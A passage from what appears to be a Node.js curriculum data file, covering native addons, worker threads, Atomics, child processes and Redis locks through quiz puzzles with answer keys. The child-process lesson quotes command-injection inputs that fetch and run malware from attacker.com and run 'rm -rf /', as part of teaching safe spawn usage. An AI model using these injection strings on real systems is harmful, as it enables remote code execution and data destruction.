    failureMode: "Calling JavaScript callbacks directly from a background C++ thread: V8 is strictly single-threaded! Calling V8 methods from an unmanaged OS thread causes an immediate fatal segmentation fault (`SIGSEGV`).",
    tryItFriction: "Write a minimal C++ addon using `node-addon-api`: implement a fast Fibonacci calculator in C++, compile it via `node-gyp`, and invoke it from TypeScript, benchmarking a 10x speedup over JavaScript.",
    socraticHints: [
      "Why did calling a JS function from our C++ background worker crash with Segmentation Fault?",
      "V8 is not thread-safe! You cannot interact with JavaScript objects from a secondary C++ thread directly.",
      "Use `napi_threadsafe_function`: it safely marshals calls from background C++ threads onto the Node.js event loop thread."
    ],
    situationalPuzzle: {
      scenario: "An enterprise candidate is asked: 'When should a team write a C++ Native Addon instead of keeping code in pure TypeScript/JavaScript?' What is the primary engineering justification?",
      options: [
        "To make the code harder to read.",
        "CPU-bound computational bottlenecks (e.g. video transcoding, heavy linear algebra, custom hardware device drivers) where JavaScript's JIT overhead or memory model is inadequate, or when integrating existing C/C++ libraries.",
        "For simple REST APIs.",
        "To bypass Node.js security."
      ],
      answerIdx: 1,
      debrief: "Native addons introduce significant compilation, deployment, and debugging complexity. They should only be used when raw native performance is essential for heavy CPU computations (cryptography, codecs, DSP) or to interface with C/C++ OS libraries."
    },
    quests: [
      { id: "node-m2-d33-q1", name: "The Node-API (N-API) ABI Stability Architecture", type: "concept", desc: "Examine N-API handles: napi_env, napi_value, napi_create_function, napi_wrap, and memory handles." },
      { id: "node-m2-d33-q2", name: "Detective Lab: The Background Thread Segmentation Fault Crash", type: "detective", desc: "Fix a native addon that crashed the process by replacing direct V8 callback invocations with napi_threadsafe_function." },
      { id: "node-m2-d33-q3", name: "Mastery Assignment: High-Speed C++ Fast-Fourier Transform Addon", type: "assignment", desc: "Build and compile a native C++ addon calculating 10,000-point Fast Fourier Transforms with node-addon-api and node-gyp." },
      { id: "node-m2-d33-q4", name: "Staff Interview Lab: Native Addons vs WebAssembly (Wasm) in Node.js", type: "detective", desc: "Compare security sandboxing, performance overhead, and deployment portability between N-API and WebAssembly." }
    ]
  },
  {
    day: 34,
    month: 2,
    blockNum: 7,
    title: "Zero-Copy Binary Manipulation: Buffer.allocUnsafe Memory Pools & Kernel sendfile",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Zero-Copy Networking & Memory Slicing)",
    spokenGoal: "Master zero-copy binary architectures: Learn how the operating system transfers data between file descriptors and network sockets without copying memory into user space (`sendfile(2)`), and master Node's internal 8KB buffer allocation pool.",
    conceptInvariant: "Traditional file serving reads data from kernel space to user space (Node.js Buffer), then writes it back to kernel space (network socket)—requiring 4 context switches and 2 CPU copies. Zero-copy operations transfer data directly between kernel buffers, achieving wire-speed throughput with near-zero CPU usage.",
    failureMode: "Reading a 5GB file into Node.js buffers chunk-by-chunk just to serve it over a static HTTP route: the CPU spends massive time copying bytes between kernel and user space rather than letting the OS handle the transfer.",
    tryItFriction: "Benchmark a static file server using standard chunked streams vs native OS kernel zero-copy transfer methods, measuring CPU utilization and throughput on a gigabit connection.",
    socraticHints: [
      "What is 'Zero-Copy' in computer networking?",
      "It means the CPU never copies the data bytes into user application memory! The data moves directly from disk cache to the network card buffer inside the OS kernel.",
      "This reduces CPU overhead to near zero and eliminates memory allocations."
    ],
    situationalPuzzle: {
      scenario: "An enterprise file storage gateway serves 10,000 concurrent video streams. CPU usage hits 100% simply copying video chunks between disk and socket streams in Node.js. How do high-performance proxies (like NGINX or specialized Node modules) solve this?",
      options: [
        "Compress the video on the fly.",
        "Kernel `sendfile()` System Call: By delegating the transfer directly to the OS kernel via sendfile, data transfers directly from disk page cache to socket descriptors without touching user-space RAM, dropping CPU usage by 80%.",
        "Increase Node.js heap to 32GB.",
        "Convert video files to JSON."
      ],
      answerIdx: 1,
      debrief: "The `sendfile(2)` system call transfers data between one file descriptor and another directly within the OS kernel. This eliminates user-space context switches and memory copies, allowing servers to saturate network cards at near-zero CPU usage."
    },
    quests: [
      { id: "node-m2-d34-q1", name: "The Linux Zero-Copy sendfile & splice System Architecture", type: "concept", desc: "Trace memory pathways: Disk -> DMA -> Page Cache -> Socket Buffer -> NIC DMA vs User Space Buffering." },
      { id: "node-m2-d34-q2", name: "Detective Lab: The Buffer Pool Contention Bottleneck", type: "detective", desc: "Profile an issue where concurrent small buffer allocations caused lock contention in Node's shared 8KB buffer pool." },
      { id: "node-m2-d34-q3", name: "Mastery Assignment: Zero-Copy Binary Protocol Frame Multiplexer", type: "assignment", desc: "Build a high-performance binary frame parser operating strictly over pre-allocated ArrayBuffer memory slices." },
      { id: "node-m2-d34-q4", name: "Staff Interview Lab: Memory Alignment & CPU Cache Line Invariants", type: "detective", desc: "Explain why 64-byte aligned memory structures prevent false sharing and maximize L1/L2 CPU cache hit rates." }
    ]
  },
  {
    day: 35,
    month: 2,
    blockNum: 7,
    title: "Milestone 6: High-Throughput Binary Telemetry Packet Parser with Node-API C++ Addon",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Native Systems & Binary Engineering)",
    spokenGoal: "Build and defend Milestone 6: A high-throughput telemetry ingestion pipeline parsing 500,000 binary sensor packets per second, featuring a custom C++ native addon compiled via Node-API, zero-copy buffer slicing, and zero memory allocations in hot paths.",
    conceptInvariant: "Extreme throughput requires hardware-level optimization: parsing fixed-width binary headers in compiled C++ SIMD instructions, avoiding JavaScript object allocations per packet, and processing batched ArrayBuffers.",
    failureMode: "Allocating a new JavaScript object `{ sensorId, timestamp, value }` for every single packet: at 500,000 packets/sec, V8 garbage collection will freeze the process within 3 seconds.",
    tryItFriction: "Benchmark your native C++ packet parser against a pure JavaScript parser: prove a 5x throughput increase (500k packets/sec) while maintaining flat memory usage.",
    socraticHints: [
      "How do we return 500,000 parsed packets per second to JavaScript without GC crashing?",
      "Don't allocate 500,000 JavaScript objects! Return a single typed Float64Array or Int32Array view over the parsed data buffer.",
      "TypedArrays represent contiguous native memory and create zero per-item object allocation overhead."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 6 defense, the evaluator feeds 1,000,000 corrupted packets with invalid checksums into your native C++ parser. How does your addon handle errors without crashing Node.js?",
      options: [
        "Throw a C++ exception (which terminates the process).",
        "Safe Error Return via Node-API: The C++ function catches the error, validates buffer boundaries, returns an error status code or throws a typed JavaScript error using `Napi::Error::New(env, ...).ThrowAsJavaScriptException()`, allowing the JS event loop to recover cleanly.",
        "Ignore the checksums.",
        "Exit with code 1."
      ],
      answerIdx: 1,
      debrief: "Native C++ code must never allow uncaught C++ exceptions or segmentation faults to escape to the OS, as they immediately terminate the Node.js process. Errors must be translated into standard JavaScript exceptions via Node-API helpers."
    },
    quests: [
      { id: "node-m2-d35-q1", name: "Milestone 6 Binary Protocol Specification & Memory Layout", type: "concept", desc: "Design the 32-byte telemetry packet specification: Magic Bytes (4B), Sensor ID (8B), Timestamp (8B), Float Values (12B)." },
      { id: "node-m2-d35-q2", name: "Detective Lab: The Buffer Overrun Segmentation Fault in C++", type: "detective", desc: "Fix an unsafe pointer arithmetic bug in a C++ addon that read past the end of an incoming buffer, causing a SIGSEGV crash." },
      { id: "node-m2-d35-q3", name: "Mastery Assignment: 500k Packets/Sec Native Telemetry Parser", type: "assignment", desc: "Deliver the complete Node-API C++ addon and TypeScript wrapper parsing 500,000 binary packets per second." },
      { id: "node-m2-d35-q4", name: "Milestone 6 Defense: Native Performance & Memory Profiling Viva", type: "detective", desc: "Defend your C++ memory management, ABI stability, and SIMD optimization choices before Senior Systems Architects." }
    ]
  },

  // ── BLOCK 8: Concurrency, Multi-Processing & Worker Threads (Days 36–40) ──────
  {
    day: 36,
    month: 2,
    blockNum: 8,
    title: "Process Clustering: The Node.js Cluster Module, Master-Worker Forking & IPC Sockets",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Clustering & Multi-Core Scaling)",
    spokenGoal: "Master multi-core scaling with the Node.js `cluster` module: Learn how the Master process forks Worker processes across all available CPU cores, how the master shares server TCP sockets via OS-level socket passing, and how to implement zero-downtime rolling worker reloads.",
    conceptInvariant: "Node.js runs on a single core by default. On a 16-core server, an unclustered Node app wastes 15 cores (93% of CPU capacity). The Cluster module forks 16 independent OS processes that share the same listening TCP port using round-robin socket distribution.",
    failureMode: "Storing user session state in an in-memory variable inside a clustered app: because requests are distributed across multiple worker processes, a user logged in on Worker 1 is treated as unauthenticated when their next request hits Worker 2.",
    tryItFriction: "Build a cluster manager using `node:cluster`: fork workers equal to `os.availableParallelism()`, handle worker death with automatic respawning, and broadcast messages via IPC.",
    socraticHints: [
      "Why did global memory state fail when we enabled clustering?",
      "Each worker is a completely SEPARATE operating system process with its own private memory heap! They do NOT share JavaScript variables.",
      "Shared state must be stored in an external shared store like Redis or a database."
    ],
    situationalPuzzle: {
      scenario: "An enterprise clustered service deploys a code update. The master process kills all 16 workers simultaneously and restarts them. During the 4-second reboot, 3,000 incoming requests are rejected with connection refused. How do you implement zero-downtime rolling restarts?",
      options: [
        "Tell clients to retry.",
        "Rolling Restart: Fork a new worker, wait for its `'listening'` event, and ONLY THEN gracefully shut down one old worker via `worker.disconnect()`. Repeat sequentially across all 16 workers, ensuring continuous capacity.",
        "Never restart workers.",
        "Run 2 masters simultaneously."
      ],
      answerIdx: 1,
      debrief: "A zero-downtime rolling restart updates workers one by one: fork new worker -> wait until it starts listening on the socket -> gracefully drain and terminate one old worker -> proceed to the next. Active user traffic is never interrupted."
    },
    quests: [
      { id: "node-m2-d36-q1", name: "The Cluster IPC Socket Handover Topology", type: "concept", desc: "Trace how the master process accepts incoming TCP connections and passes the socket file descriptor to workers over IPC." },
      { id: "node-m2-d36-q2", name: "Detective Lab: The Clustered In-Memory State Desynchronization Glitch", type: "detective", desc: "Diagnose an e-commerce cart that randomly lost items because cart data was stored in an in-memory Map across 4 cluster workers." },
      { id: "node-m2-d36-q3", name: "Mastery Assignment: Zero-Downtime Clustered Process Supervisor", type: "assignment", desc: "Build a production cluster manager with CPU core scaling, worker health checks, rolling restarts, and crash backoff." },
      { id: "node-m2-d36-q4", name: "Staff Interview Lab: SO_REUSEPORT Kernel Load Balancing vs Master Round-Robin", type: "detective", desc: "Compare Linux kernel SO_REUSEPORT port sharing versus Node.js master round-robin socket distribution under heavy load." }
    ]
  },
  {
    day: 37,
    month: 2,
    blockNum: 8,
    title: "Multi-Threaded JavaScript: worker_threads, Worker Pools & Thread Communication",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Worker Threads & Multi-Threading)",
    spokenGoal: "Master true multi-threading in Node.js with `worker_threads`: Learn how Worker Threads share the same process memory space while running independent V8 isolates and event loops, and how to build a thread pool to offload heavy CPU calculations without blocking the main event loop.",
    conceptInvariant: "Cluster forks separate OS PROCESSES (isolated memory, heavy startup). Worker Threads run separate V8 isolates inside the SAME process (lighter memory, fast startup, capable of sharing memory via SharedArrayBuffer). Worker threads must be pooled to avoid thread creation overhead.",
    failureMode: "Spawning a `new Worker()` on every incoming HTTP request: thread creation allocates a new V8 isolate and call stack, consuming 20MB of RAM and 50ms of CPU per request, quickly exhausting system memory.",
    tryItFriction: "Create a persistent Worker Pool with 4 threads: dispatch 100 CPU-intensive image resizing jobs across the pool, verifying that the main HTTP thread continues serving ping requests with sub-5ms latency.",
    socraticHints: [
      "Why shouldn't we create a `new Worker()` inside a route handler?",
      "Spinning up a thread creates an entire new V8 engine instance, taking tens of milliseconds and megabytes of RAM!",
      "Maintain a fixed pool of pre-warmed worker threads (e.g. Piscina or custom pool) and send tasks to idle workers via message queues."
    ],
    situationalPuzzle: {
      scenario: "An engineer offloads a complex report calculation to a Worker Thread. They pass a 50MB JavaScript object via `worker.postMessage(largeObject)`. The main thread freezes for 60ms during the postMessage call. Why did the main thread freeze?",
      options: [
        "The worker thread was full.",
        "Structured Clone Serialization: By default, `postMessage` deep-copies objects using the HTML Structured Clone Algorithm. Serializing a 50MB object into a binary clone graph runs synchronously on the main thread, freezing the event loop.",
        "The computer ran out of memory.",
        "Worker threads cannot receive objects."
      ],
      answerIdx: 1,
      debrief: "`postMessage()` uses structured cloning by default, which deep-copies the entire object graph synchronously on the calling thread. For large datasets, use Transferable Objects (ArrayBuffers) or SharedArrayBuffer to avoid serialization costs."
    },
    quests: [
      { id: "node-m2-d37-q1", name: "The Worker Thread V8 Isolate Topology", type: "concept", desc: "Trace V8 Isolate memory boundaries: MessagePort, MessageChannel, workerData, parentPort, and thread execution contexts." },
      { id: "node-m2-d37-q2", name: "Detective Lab: The Unpooled Thread Spawning Memory Collapse", type: "detective", desc: "Refactor a service that crashed under load due to spawning 500 concurrent worker threads on incoming HTTP requests." },
      { id: "node-m2-d37-q3", name: "Mastery Assignment: Production Worker Thread Pool Engine (Piscina Architecture)", type: "assignment", desc: "Build an asynchronous worker pool with task queues, idle timeouts, worker recycling, and task prioritization." },
      { id: "node-m2-d37-q4", name: "Staff Interview Lab: Comparing Cluster vs Worker Threads vs Child Processes", type: "detective", desc: "Articulate a comprehensive trade-off matrix evaluating memory isolation, crash blast radius, and communication latency." }
    ]
  },
  {
    day: 38,
    month: 2,
    blockNum: 8,
    title: "Shared Memory & Lock-Free Computing: SharedArrayBuffer & Atomics Operations in Node.js",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Shared Memory & Atomic Primitives)",
    spokenGoal: "Master shared memory and lock-free concurrency in Node.js: Learn how `SharedArrayBuffer` allows multiple worker threads to read and write the exact same physical memory address simultaneously without message copying, and use `Atomics` (`add`, `load`, `store`, `compareExchange`, `wait`, `notify`) to prevent race conditions.",
    conceptInvariant: "When multiple threads mutate `SharedArrayBuffer` memory simultaneously without coordination, data race conditions corrupt values. Standard JavaScript operations (`arr[0]++`) are NOT atomic (they compile to read-modify-write CPU instructions). You MUST use `Atomics.add(arr, 0, 1)` to guarantee atomic execution.",
    failureMode: "Incrementing a shared counter in 4 worker threads with `shared[0]++`: after 1,000,000 increments per thread, the final count is 2,341,200 instead of 4,000,000 due to unsynchronized CPU cache overwrites.",
    tryItFriction: "Demonstrate a data race on a `SharedArrayBuffer` counter across 4 worker threads, then replace raw increments with `Atomics.add()` and prove that the final count is mathematically 100% accurate.",
    socraticHints: [
      "Why did four threads incrementing a shared counter 100,000 times result in a count of only 250,000?",
      "Thread A read 10; Thread B read 10. Thread A wrote 11; Thread B wrote 11. One increment was lost!",
      "Use `Atomics.add(int32Array, 0, 1)`. It executes an atomic CPU instruction that locks the memory bus for that byte."
    ],
    situationalPuzzle: {
      scenario: "An engineer builds a high-performance inter-thread synchronization lock using `SharedArrayBuffer`. Worker Thread 2 needs to wait until Worker Thread 1 finishes a task. How does Worker 2 sleep efficiently without burning 100% CPU in a while spin-loop?",
      options: [
        "Run an empty `while (shared[0] === 0) {}` loop.",
        "`Atomics.wait()`: Puts the worker thread to sleep at the OS kernel level until Worker 1 updates the value and wakes it up using `Atomics.notify()`, consuming 0% CPU while waiting.",
        "Call setTimeout in a loop.",
        "Reboot the thread."
      ],
      answerIdx: 1,
      debrief: "Spinning in an empty while loop consumes 100% CPU. `Atomics.wait(typedArray, index, value)` puts the thread into an efficient kernel sleep state until another thread modifies the value and calls `Atomics.notify(typedArray, index, count)`."
    },
    quests: [
      { id: "node-m2-d38-q1", name: "The Atomics Hardware Memory Model Specification", type: "concept", desc: "Trace CPU cache coherence protocols (MESI), memory barriers, compare-and-swap (CAS), and Atomics operations." },
      { id: "node-m2-d38-q2", name: "Detective Lab: The Unsynchronized SharedArrayBuffer Data Corruption", type: "detective", desc: "Isolate a financial ledger balance calculation corrupted by non-atomic increments across worker threads." },
      { id: "node-m2-d38-q3", name: "Mastery Assignment: Lock-Free Single-Producer Single-Consumer (SPSC) Ring Buffer", type: "assignment", desc: "Build a lock-free circular ring buffer over SharedArrayBuffer using Atomics for zero-latency inter-thread messaging." },
      { id: "node-m2-d38-q4", name: "Staff Interview Lab: Lock-Free CAS (Compare-And-Swap) Algorithms", type: "detective", desc: "Implement a lock-free mutex spinlock using `Atomics.compareExchange` and analyze the ABA problem." }
    ]
  },
  {
    day: 39,
    month: 2,
    blockNum: 8,
    title: "Child Processes & OS Integration: spawn, fork, exec & Stdio Pipe Stream Routing",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (OS Child Processes & Stream Piping)",
    spokenGoal: "Master operating system child process execution: Contrast `spawn`, `fork`, `exec`, and `execFile`, understand how to stream stdin/stdout/stderr pipes without buffer limits, and eliminate fatal command injection vulnerabilities.",
    conceptInvariant: "NEVER use `child_process.exec()` with concatenated user input strings. `exec()` passes the string to a system shell (`/bin/sh`), allowing attackers to append malicious commands with semicolons (`; rm -rf /`). Always use `child_process.spawn()` or `execFile()`, which execute binaries directly without shell expansion.",
    failureMode: "Using `child_process.exec('ffmpeg -i ' + userInput)`: an attacker enters `test.mp4; curl attacker.com/malware | sh`, achieving remote code execution on the server.",
    tryItFriction: "Demonstrate a command injection exploit using `exec()`, then refactor to `spawn('ffmpeg', ['-i', userInput])` and prove that shell injection characters are safely treated as literal argument strings.",
    socraticHints: [
      "Why is `child_process.spawn` safe from command injection while `exec` is dangerous?",
      "`exec` runs your command inside a shell (`/bin/sh -c`), so characters like `;`, `&&`, and `|` are evaluated as shell commands!",
      "`spawn` runs the executable binary directly and passes arguments as an immutable array, bypassing the shell completely."
    ],
    situationalPuzzle: {
      scenario: "An automated backup script runs `exec('tar -czf backup.tar.gz /data')`. The command outputs 2.5MB of progress text to stdout. The process terminates abruptly with `Error: maxBuffer length exceeded`. Why did it fail?",
      options: [
        "The disk ran out of space.",
        "Buffer Overflow in exec: `exec()` buffers all stdout in memory and defaults to a hard 1MB limit (`maxBuffer`). When output exceeds 1MB, it terminates the process. You must use `spawn()` and stream stdout chunks.",
        "tar is not supported in Node.js.",
        "The file was locked."
      ],
      answerIdx: 1,
      debrief: "child_process.exec buffers all standard output in memory up to maxBuffer (default 1MB). For any command producing large output, use child_process.spawn which returns standard streams (stdout, stderr) that can be piped safely with zero buffer limits."
    },
    quests: [
      { id: "node-m2-d39-q1", name: "The Child Process IPC & Stdio Pipe Topology", type: "concept", desc: "Trace stdio configurations: 'pipe', 'ignore', 'inherit', IPC channels, and process isolation." },
      { id: "node-m2-d39-q2", name: "Detective Lab: The Remote Command Injection Shell Exploit", type: "detective", desc: "Isolate a critical vulnerability in an image conversion utility that allowed arbitrary shell command execution via exec." },
      { id: "node-m2-d39-q3", name: "Mastery Assignment: Resilient CLI Tool Runner with Streaming Stdio", type: "assignment", desc: "Build an external process supervisor running system binaries with streaming output, timeout guards, and clean SIGKILL reaping." },
      { id: "node-m2-d39-q4", name: "Production Incident Lab: Zombie Process Accumulation & Subreaper", type: "detective", desc: "Understand how un-reaped child processes become zombies and how init systems reap terminated child descriptors." }
    ]
  },
  {
    day: 40,
    month: 2,
    blockNum: 8,
    title: "Milestone 7: Multi-Core Distributed Matrix Multiplier with WorkerPool & Atomics",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Parallel Computing & Shared Memory)",
    spokenGoal: "Build and defend Milestone 7: A parallel matrix multiplication engine multiplying two 2,000 x 2,000 floating-point matrices (16,000,000 operations) across all CPU cores using `worker_threads`, `SharedArrayBuffer`, and `Atomics` synchronization, achieving a 6x speedup over single-threaded execution.",
    conceptInvariant: "Parallel compute systems must divide work into cache-aligned contiguous row chunks, write results directly into a shared output buffer without IPC copying, and coordinate task completion using atomic countdown latches.",
    failureMode: "Experiencing frame drops or thread contention where parallel execution runs SLOWER than single-threaded code due to false sharing or excessive message passing overhead.",
    tryItFriction: "Benchmark 2,000x2,000 matrix multiplication: assert that single-threaded execution takes ~4,500ms, while your 8-core WorkerPool completes the calculation in under 800ms with 100% mathematical precision.",
    socraticHints: [
      "Why would parallel execution be slower than single-threaded execution?",
      "If you transfer the matrix data via `postMessage`, copying hundreds of megabytes of memory across threads takes more time than the actual multiplication math!",
      "Use `SharedArrayBuffer` so all threads read the input matrices and write to the output matrix directly in shared RAM with ZERO copying."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 7 review, the evaluator increases matrix size to 4,000 x 4,000. Your worker threads crash with `RangeError: Array buffer allocation failed`. How does an experienced systems engineer handle memory allocation bounds?",
      options: [
        "Ask the user to multiply smaller matrices.",
        "Tile-based / Block Matrix Multiplication: Break the giant matrix into smaller sub-matrix tiles that fit into L3 CPU cache and available RAM budgets, streaming tiles sequentially through the worker pool.",
        "Allocate the buffer in localStorage.",
        "Disable threads."
      ],
      answerIdx: 1,
      debrief: "When datasets exceed continuous memory buffers or CPU cache capacity, block/tiled matrix algorithms divide the problem into cache-friendly chunks. This eliminates memory exhaustion and dramatically improves CPU cache hit rates."
    },
    quests: [
      { id: "node-m2-d40-q1", name: "Milestone 7 Parallel Compute Architecture Specification", type: "concept", desc: "Design the parallel computation pipeline: Matrix partitioning, SharedArrayBuffer layouts, worker dispatch, and atomic countdowns." },
      { id: "node-m2-d40-q2", name: "Detective Lab: The Memory Copying Performance Penalty", type: "detective", desc: "Refactor an algorithm where postMessage copying overhead made multi-threaded execution 3x slower than single-threaded code." },
      { id: "node-m2-d40-q3", name: "Mastery Assignment: 8-Core Parallel Matrix Multiplier with Atomics", type: "assignment", desc: "Deliver the production parallel compute engine with SharedArrayBuffer, lock-free coordination, and verified benchmarks." },
      { id: "node-m2-d40-q4", name: "Milestone 7 Defense: Multi-Threaded Concurrency & CPU Profiling Viva", type: "detective", desc: "Defend your memory partitioning, thread balancing, and cache alignment choices before Senior Systems Architects." }
    ]
  },

  // ── BLOCK 9: Distributed Caching, Redis Architecture & Message Queues (Days 41–45)
  {
    day: 41,
    month: 2,
    blockNum: 9,
    title: "Redis In-Memory Architecture: Single-Threaded Event Model, Data Structures & O(1) Operations",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Redis Architecture & In-Memory Data Structures)",
    spokenGoal: "Master Redis as a high-performance in-memory cache and state store: Understand Redis's single-threaded event-driven architecture, master core data structures (Strings, Hashes, Lists, Sets, Sorted Sets / ZSETs), and leverage atomic O(1) operations.",
    conceptInvariant: "Like Node.js, Redis executes commands on a single thread against in-memory data structures, eliminating lock contention. Calling an O(N) command like `KEYS *` on a production Redis instance with 10,000,000 keys will freeze Redis completely for seconds, blocking ALL other queries globally.",
    failureMode: "Running `redis.keys('user:*')` in production to find active sessions: Redis freezes for 4 seconds, causing all backend API instances to time out on session verification.",
    tryItFriction: "Demonstrate that `KEYS *` blocks a live Redis instance, then refactor to `SCAN` which iterates through keys incrementally via an asynchronous cursor without blocking.",
    socraticHints: [
      "Why did the entire website crash when our admin dashboard loaded?",
      "The dashboard called `KEYS user:*`! Redis had 5 million keys, so its single execution thread froze while scanning every single key in RAM.",
      "Never use `KEYS` in production. Use `SCAN` for cursor-based iteration, or maintain a Set of active keys."
    ],
    situationalPuzzle: {
      scenario: "A real-time gaming leaderboard tracks scores for 1,000,000 active players. When a player scores points, their rank must be updated and the top 10 players displayed. Which Redis data structure delivers O(log N) updates and instant O(1) top-10 queries?",
      options: [
        "Redis String",
        "Redis Hash",
        "Redis Sorted Set (ZSET): Stores elements with scores ordered by a Skip List and Hash Map, allowing updates in O(log N) and range queries via `ZREVRANGE 0 9` in O(log N + M).",
        "Redis List"
      ],
      answerIdx: 2,
      debrief: "Redis Sorted Sets (ZSETs) combine a Hash Map (for O(1) score lookups) with a Skip List (for O(log N) score ordering). This makes them the premier data structure for leaderboards, rate limiters, and priority queues."
    },
    quests: [
      { id: "node-m2-d41-q1", name: "The Redis In-Memory Storage & Skip List Architecture", type: "concept", desc: "Deconstruct Redis memory internals: SDS (Simple Dynamic Strings), Dicts, Skip Lists, Quicklists, and jemalloc memory allocator." },
      { id: "node-m2-d41-q2", name: "Detective Lab: The KEYS * Production Freeze Outage", type: "detective", desc: "Isolate a production outage caused by an unindexed KEYS wildcard scan and replace it with cursor-based SCAN pipelines." },
      { id: "node-m2-d41-q3", name: "Mastery Assignment: High-Scale Real-Time Leaderboard with ZSETs", type: "assignment", desc: "Build a gaming leaderboard managing 100,000 players with atomic score increments, rank lookups, and top-tier slicing." },
      { id: "node-m2-d41-q4", name: "Production Incident Lab: Redis Eviction Policies & OOM Protection", type: "detective", desc: "Configure `maxmemory` and eviction policies (volatile-lru vs allkeys-lru vs noeviction) to prevent Redis OOM crashes." }
    ]
  },
  {
    day: 42,
    month: 2,
    blockNum: 8,
    title: "Cache Stampede Mitigation: The XFetch Algorithm (Probabilistic Early Expiration) & Mutex Locks",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Cache Stampede & Probabilistic Expiration)",
    spokenGoal: "Master Cache Stampede (Thundering Herd) mitigation: Understand what happens when a heavily cached database query (accessed 5,000 times/sec) expires, causing thousands of concurrent requests to hit the database simultaneously, and implement the XFetch probabilistic early expiration algorithm.",
    conceptInvariant: "When a hot cache key expires, thousands of simultaneous requests experience a cache miss and all execute the heavy database query at the same millisecond, crashing the database. The XFetch algorithm probabilistically triggers a single background refresh BEFORE the cache expires: `delta * beta * Math.log(Math.random()) > ttl - now`.",
    failureMode: "Setting a static 60-second TTL on a homepage product query: at second 61, 3,000 requests all query PostgreSQL simultaneously, exhausting the database connection pool and taking down the site.",
    tryItFriction: "Implement the XFetch algorithm in a custom Redis caching wrapper: simulate 1,000 concurrent reads near the expiration boundary, proving that exactly ONE request refreshes the cache while others continue reading stale data.",
    socraticHints: [
      "Why did the database crash at 12:00:00 when the cache key expired?",
      "Thundering Herd! 2,000 requests hit the server at 12:00:00, found the key expired, and all ran the expensive SQL query simultaneously.",
      "Use XFetch or a distributed mutex lock: only ONE request is allowed to query the database and update the cache; others serve the existing value."
    ],
    situationalPuzzle: {
      scenario: "An enterprise candidate is asked: 'Why is Probabilistic Early Expiration (XFetch) superior to standard Mutex Locking when mitigating Cache Stampedes on ultra-hot read endpoints?'",
      options: [
        "Because it uses more memory.",
        "Zero Latency Penalty: Mutex locks force concurrent requests to wait for the database refresh to complete before returning. XFetch computes the refresh in the background while continuing to serve the cached value instantly, ensuring sub-5ms response times at all times.",
        "XFetch does not require Redis.",
        "Mutexes are not allowed in Node.js."
      ],
      answerIdx: 1,
      debrief: "Mutex locking forces waiting requests to queue up and wait for the database query to finish, introducing latency spikes for users. XFetch probabilistically recalculates the value before it expires, serving the cached value with zero added latency."
    },
    quests: [
      { id: "node-m2-d42-q1", name: "The Mathematical Proof of the XFetch Algorithm", type: "concept", desc: "Derive the formula: e^(-delta * beta / ttl) and prove how beta parameters tune early recalculation probability." },
      { id: "node-m2-d42-q2", name: "Detective Lab: The Black Friday Cache Stampede Outage", type: "detective", desc: "Diagnose an e-commerce database collapse caused by simultaneous expiration of product catalog cache keys." },
      { id: "node-m2-d42-q3", name: "Mastery Assignment: Production XFetch Caching Layer with Redis", type: "assignment", desc: "Build an enterprise caching decorator implementing XFetch probabilistic re-computation and fallback mutexes." },
      { id: "node-m2-d42-q4", name: "Staff Interview Lab: Dogpiling Mitigation Strategies", type: "detective", desc: "Compare XFetch vs Redis Distributed Locks vs Stale-While-Revalidate background fetchers across throughput and consistency." }
    ]
  },
  {
    day: 43,
    month: 2,
    blockNum: 9,
    title: "Distributed Locks in Redis: The Redlock Algorithm, TTLs & Token Expiration Fencing",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Distributed Locks & Fencing Tokens)",
    spokenGoal: "Master distributed locking across multiple Node.js instances: Understand why in-memory mutexes fail in clustered environments, implement atomic Redis locks using `SET key value NX PX`, analyze Martin Kleppmann's critique of the Redlock algorithm, and implement monotonic Fencing Tokens to prevent split-brain writes.",
    conceptInvariant: "Acquiring a distributed lock requires an atomic command: `SET lock_key unique_token NX PX 5000`. Releasing the lock requires a Lua script that verifies the token matches before deleting it. To prevent stale lock holders from overwriting state after GC pauses, the storage system must enforce monotonically increasing Fencing Tokens.",
    failureMode: "Releasing a lock with a simple `redis.del('lock_key')`: if Process A's lock expired due to a GC pause, and Process B acquired the lock, Process A's delayed `del` will delete PROCESS B's lock, breaking all mutual exclusion guarantees.",
    tryItFriction: "Write a safe distributed lock release Lua script in Redis: assert that `DEL` only executes if `GET(key) === clientToken`, and demonstrate that expired locks cannot be deleted by old holders.",
    socraticHints: [
      "Why must releasing a Redis lock be done via a Lua script?",
      "Checking the token and deleting the key must be ATOMIC! If you check in JavaScript and then call DEL, the lock could expire between those two commands.",
      "A Redis Lua script executes atomically on the Redis thread with zero race conditions."
    ],
    situationalPuzzle: {
      scenario: "Process A acquires a 5-second distributed lock. Process A experiences a 6-second V8 Garbage Collection pause. The lock expires; Process B acquires the lock and writes to storage. Process A wakes up and writes its stale data to storage, corrupting Process B's work. How do Fencing Tokens solve this?",
      options: [
        "Make the lock timeout 100 seconds.",
        "Monotonic Fencing Tokens: Every time a lock is acquired, the lock server issues a strictly incrementing number (e.g. Lock #101). The storage system rejects any write whose fencing token is less than the highest token seen (rejecting Process A's #100).",
        "Restart Process A.",
        "Disable garbage collection."
      ],
      answerIdx: 1,
      debrief: "A distributed lock cannot guarantee safety against asynchronous pauses (GC, network delay). Fencing Tokens solve this by attaching an incrementing sequence number to the lock. The downstream storage rejects writes from older tokens, preventing stale updates."
    },
    quests: [
      { id: "node-m2-d43-q1", name: "The Distributed Lock Safety Specification", type: "concept", desc: "Examine mutual exclusion, deadlock freedom, fault tolerance, and the Martin Kleppmann vs Salvatore Sanfilippo debate." },
